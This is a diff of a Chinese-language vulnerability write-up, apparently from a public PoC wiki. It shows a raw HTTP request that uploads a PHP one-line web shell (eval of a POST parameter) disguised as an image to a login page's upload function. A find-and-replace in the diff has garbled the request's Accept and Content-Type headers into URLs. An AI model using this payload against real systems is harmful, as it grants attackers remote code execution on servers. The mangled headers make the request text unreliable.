@@ -20,7 +20,7 @@
 
 登录页面如下
 
-![](image/szy-1.png)
+![](http://wikioss.peiqi.tech/vuln/szy-1.png)
 
 发送请求包上传PHP文件
 
@@ -33,19 +33,19 @@ Upgrade-Insecure-Requests: 1
 Origin: null
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
 
 ------WebKitFormBoundary8UaANmWAgM4BqBSs
 Content-Disposition: form-data; name="upfile"; filename="pq.php"
-Content-Type: image/gif
+Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif
 
 <?php @eval($_POST['pq']);?>
 ------WebKitFormBoundary8UaANmWAgM4BqBSs--
 ```
 
-![](image/szy-2.png)
+![](http://wikioss.peiqi.tech/vuln/szy-2.png)
 
-![](image/szy-3.png)
+![](http://wikioss.peiqi.tech/vuln/szy-3.png)
